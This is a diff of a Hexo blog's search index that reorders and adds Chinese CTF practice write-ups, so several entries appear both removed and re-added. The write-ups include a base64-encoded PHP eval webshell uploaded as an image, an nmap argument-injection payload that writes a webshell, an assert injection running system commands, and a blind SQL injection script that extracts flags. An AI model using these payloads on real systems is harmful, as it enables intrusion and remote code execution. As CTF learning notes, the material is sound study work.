@@ -235,6 +235,17 @@ EXECUTE name;  //执行预定义SQL语句
       </tags>
   </entry>
   <entry>
+    <title>20210601</title>
+    <url>/posts/810f4ee1/</url>
+    <content><![CDATA[<h2 id="最近几天在打比赛，断更"><a href="#最近几天在打比赛，断更" class="headerlink" title="最近几天在打比赛，断更"></a>最近几天在打比赛，断更</h2>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20210524</title>
     <url>/posts/c11566b5/</url>
     <content><![CDATA[<h2 id="flag藏在变量里"><a href="#flag藏在变量里" class="headerlink" title="flag藏在变量里"></a>flag藏在变量里</h2><p>神奇的GLOBALS打印出全部变量<br>    /?args=GLOBALS</p>
@@ -372,41 +383,6 @@ findFile(path)
       </tags>
   </entry>
   <entry>
-    <title>20210601</title>
-    <url>/posts/810f4ee1/</url>
-    <content><![CDATA[<h2 id="最近几天在打比赛，断更"><a href="#最近几天在打比赛，断更" class="headerlink" title="最近几天在打比赛，断更"></a>最近几天在打比赛，断更</h2>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210615</title>
-    <url>/posts/9f79bbb9/</url>
-    <content><![CDATA[<h2 id="蓝帽杯-2021-One-Pointer"><a href="#蓝帽杯-2021-One-Pointer" class="headerlink" title="[蓝帽杯 2021]One Pointer"></a>[蓝帽杯 2021]One Pointer</h2><p>首先下载源码，包含user.php和add_api.php代码审计</p>
-<p>add_api.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>可以看出是将cookie的data反序列化后赋值给user,抓包发现cookie有个默认的data</p>
-<p>O:4:”User”:1:{s:5:”count”;i:3;}</p>
-<p>这里利用和校赛类似的数组溢出的漏洞，将count设为9223372036854775806，实现自加1后，再赋值就会失败，进而执行eval($_GET[“backdoor”])，方便后续用蚁剑连</p>
-<p>更改一下cookie,然后用蚁剑连，发现有访问目录限制，用插件发现用不了，然后就不会了。<br>查了查，有两种方法。</p>
-<p>第一种是更改fsockopen为pfsockopen,然后再添加端口9001，然后就可以用插件连了。</p>
-<p>第二种是挺花哨的，利用fpm，反弹shell，要在服务器上监听，但我还没有公网服务器，这个暂时理解了下，没法实践。</p>
-<p>放个链接<a href="https://blog.csdn.net/baidu_39504221/article/details/116720875">https://blog.csdn.net/baidu_39504221/article/details/116720875</a></p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20210817</title>
     <url>/posts/7be9f79f/</url>
     <content><![CDATA[<blockquote>
@@ -481,6 +457,27 @@ findFile(path)
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210819</title>
+    <url>/posts/9c51da98/</url>
+    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
+<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
+</code></pre>
+<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
+<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
+<pre><code> echo urlencode(serialize($KEY));
+</code></pre>
+<p>先urlencode一下不容易出错</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -576,6 +573,30 @@ Submit
       </tags>
   </entry>
   <entry>
+    <title>20210615</title>
+    <url>/posts/9f79bbb9/</url>
+    <content><![CDATA[<h2 id="蓝帽杯-2021-One-Pointer"><a href="#蓝帽杯-2021-One-Pointer" class="headerlink" title="[蓝帽杯 2021]One Pointer"></a>[蓝帽杯 2021]One Pointer</h2><p>首先下载源码，包含user.php和add_api.php代码审计</p>
+<p>add_api.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出是将cookie的data反序列化后赋值给user,抓包发现cookie有个默认的data</p>
+<p>O:4:”User”:1:{s:5:”count”;i:3;}</p>
+<p>这里利用和校赛类似的数组溢出的漏洞，将count设为9223372036854775806，实现自加1后，再赋值就会失败，进而执行eval($_GET[“backdoor”])，方便后续用蚁剑连</p>
+<p>更改一下cookie,然后用蚁剑连，发现有访问目录限制，用插件发现用不了，然后就不会了。<br>查了查，有两种方法。</p>
+<p>第一种是更改fsockopen为pfsockopen,然后再添加端口9001，然后就可以用插件连了。</p>
+<p>第二种是挺花哨的，利用fpm，反弹shell，要在服务器上监听，但我还没有公网服务器，这个暂时理解了下，没法实践。</p>
+<p>放个链接<a href="https://blog.csdn.net/baidu_39504221/article/details/116720875">https://blog.csdn.net/baidu_39504221/article/details/116720875</a></p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>对web漏洞常见缩写的解释</title>
     <url>/posts/e15b0610/</url>
     <content><![CDATA[<h1 id="对web漏洞常见缩写的解释"><a href="#对web漏洞常见缩写的解释" class="headerlink" title="对web漏洞常见缩写的解释"></a>对web漏洞常见缩写的解释</h1><h2 id="xss（跨站脚本攻击）"><a href="#xss（跨站脚本攻击）" class="headerlink" title="xss（跨站脚本攻击）"></a>xss（跨站脚本攻击）</h2><p>全称<strong>Cross Site Scripting</strong>，攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
@@ -610,27 +631,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210819</title>
-    <url>/posts/9c51da98/</url>
-    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
-<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
-</code></pre>
-<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
-<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
-<pre><code> echo urlencode(serialize($KEY));
-</code></pre>
-<p>先urlencode一下不容易出错</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>202108202</title>
     <url>/posts/3719f1b1/</url>
     <content><![CDATA[<ol>
@@ -647,6 +647,20 @@ Submit
       <categories>
         <category>随笔</category>
       </categories>
+  </entry>
+  <entry>
+    <title>20210827</title>
+    <url>/posts/50c4a45c/</url>
+    <content><![CDATA[<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次写与ctf有关的python脚本(抄的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19128/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">ret=s.get(url)</span><br><span class="line"></span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,ret.text).group()</span><br><span class="line"></span><br><span class="line">ans=<span class="built_in">eval</span>(equation)</span><br><span class="line"></span><br><span class="line">d=&#123;<span class="string">&quot;value&quot;</span>:ans&#125;</span><br><span class="line"></span><br><span class="line">flag=s.post(url,data=d)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>python</tag>
+      </tags>
   </entry>
   <entry>
     <title>202108203</title>
@@ -680,20 +694,6 @@ Submit
       <tags>
         <tag>ctf</tag>
         <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210827</title>
-    <url>/posts/50c4a45c/</url>
-    <content><![CDATA[<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次写与ctf有关的python脚本(抄的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19128/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">ret=s.get(url)</span><br><span class="line"></span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,ret.text).group()</span><br><span class="line"></span><br><span class="line">ans=<span class="built_in">eval</span>(equation)</span><br><span class="line"></span><br><span class="line">d=&#123;<span class="string">&quot;value&quot;</span>:ans&#125;</span><br><span class="line"></span><br><span class="line">flag=s.post(url,data=d)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -733,6 +733,90 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210907</title>
+    <url>/posts/6330ace9/</url>
+    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
+<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
+<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
+</code></pre>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>命令执行</tag>
+        <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210926</title>
+    <url>/posts/2601fefd/</url>
+    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>先贴一篇文章，讲的比较好，关于mysql注入的</p>
+<p><a href="https://www.anquanke.com/post/id/85936">https://www.anquanke.com/post/id/85936</a></p>
+<p>这个题呢，最终就是直接跑脚本</p>
+<p>测试1，2会返回两个语句，测试2-1返回1的语句，是数字型注入，然后union发现有waf,fuzz获取过滤的字段，这里学会了怎么用bp进行fuzz，以及fuzzdb这个仓库</p>
+<p>正确的方法是先利用if语句，实现布尔注入。利用括号来绕过空格的过滤。经过测试，用TAB或者%09%0a%0d之类这样的绕过方式也可以成功绕过空格。</p>
+<p>sql的三目运算</p>
+<pre><code>if( 表达式1，表达式2，表达式3)
+</code></pre>
+<p>如果表达式1是正确的，那么执行表达式2，否则执行表达式3</p>
+<p>或者异或注入</p>
+<pre><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)
+</code></pre>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:</span><br><span class="line">        sqls = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=ascii(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: sqls</span><br><span class="line">        &#125;</span><br><span class="line">        res = r.post(url=url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>看到<a href="https://blog.csdn.net/rfrder/article/details/109263584">https://blog.csdn.net/rfrder/article/details/109263584</a>这个大佬想到了stripos的漏洞</p>
+<blockquote>
+<p>这时候想到stripos函数的一个漏洞。如果没有找到的话返回的是false，如果找到了但是是在字符串的首位，返回的是0。如果后端用了弱类型比较的话，0==false，这样后面就可以使用被过滤的某一个字符串了</p>
+</blockquote>
+<p>进行尝试，</p>
+<p>首先id=1union：</p>
+<p>SQL Injection Checked.</p>
+<p>再试试id=union1union：</p>
+<p>bool(false)</p>
+<p>如果这个题目把括号,tab,以及各种可以充当空格的都给过滤了的话，就用这种方法来绕过空格的过滤。</p>
+<p>不过不知道为啥，每次跑出的flag都不一样，呃呃呃，然后都不能过。。。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d9a6fbce43f97d2164f1b3e&#125;</span><br><span class="line">flag&#123;d95e7a6fc1e43f7d164f414b&#125;</span><br><span class="line">flag&#123;d9e7a6fc1e43f7d214f41b3e&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原来是’-‘被过滤了，测试到-的时候会返回sql注入</p>
+<p>服务器出了点小意外，不能push了，cpu给爆了，不知道为啥。。</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+        <tag>测试工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210901</title>
+    <url>/posts/8a5309dc/</url>
+    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
+<p>git泄露，代码审计，assert命令执行</p>
+</blockquote>
+<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
+</code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
+</code></pre>
+<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
@@ -797,18 +881,20 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210901</title>
-    <url>/posts/8a5309dc/</url>
-    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
-<p>git泄露，代码审计，assert命令执行</p>
+    <title>20211015</title>
+    <url>/posts/2348a06e/</url>
+    <content><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><blockquote>
+<p>模板注入</p>
 </blockquote>
-<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
-</code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
-</code></pre>
-<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
+<p>先看提示，发现hints和/fllllllllllllag，根据url猜测是任意文件读取，研究后面参数，看hints，发现render，研究研究啥玩意</p>
+<p>render是一个类似模板的东西，可以使用不同的参数来访问网页</p>
+<p>在tornado模板中，存在一些可以访问的快速对象，例如 <code>&#123;&#123;handler.settings&#125;&#125;</code></p>
+<p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p>
+<p>而RequestHandler.settings又指向self.application.settings</p>
+<p>所有handler.settings就指向RequestHandler.application.settings</p>
+<p>可以获得一些设置</p>
+<p>然后成功获得cookie_secret，md5获得hash值即可</p>
+<p>在msg页面可以实现模板注入</p>
 ]]></content>
       <categories>
         <category>ctf每日一题</category>
@@ -816,59 +902,30 @@ Submit
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
-    <title>20210907</title>
-    <url>/posts/6330ace9/</url>
-    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
-<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
-<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
-</code></pre>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>rce</tag>
-        <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210926</title>
-    <url>/posts/2601fefd/</url>
-    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>先贴一篇文章，讲的比较好，关于mysql注入的</p>
-<p><a href="https://www.anquanke.com/post/id/85936">https://www.anquanke.com/post/id/85936</a></p>
-<p>这个题呢，最终就是直接跑脚本</p>
-<p>测试1，2会返回两个语句，测试2-1返回1的语句，是数字型注入，然后union发现有waf,fuzz获取过滤的字段，这里学会了怎么用bp进行fuzz，以及fuzzdb这个仓库</p>
-<p>正确的方法是先利用if语句，实现布尔注入。利用括号来绕过空格的过滤。经过测试，用TAB或者%09%0a%0d之类这样的绕过方式也可以成功绕过空格。</p>
-<p>sql的三目运算</p>
-<pre><code>if( 表达式1，表达式2，表达式3)
-</code></pre>
-<p>如果表达式1是正确的，那么执行表达式2，否则执行表达式3</p>
-<p>或者异或注入</p>
-<pre><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)
-</code></pre>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:</span><br><span class="line">        sqls = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=ascii(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: sqls</span><br><span class="line">        &#125;</span><br><span class="line">        res = r.post(url=url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>看到<a href="https://blog.csdn.net/rfrder/article/details/109263584">https://blog.csdn.net/rfrder/article/details/109263584</a>这个大佬想到了stripos的漏洞</p>
-<blockquote>
-<p>这时候想到stripos函数的一个漏洞。如果没有找到的话返回的是false，如果找到了但是是在字符串的首位，返回的是0。如果后端用了弱类型比较的话，0==false，这样后面就可以使用被过滤的某一个字符串了</p>
+    <title>20210927</title>
+    <url>/posts/5106ce6b/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><blockquote>
+<p>php模板注入</p>
 </blockquote>
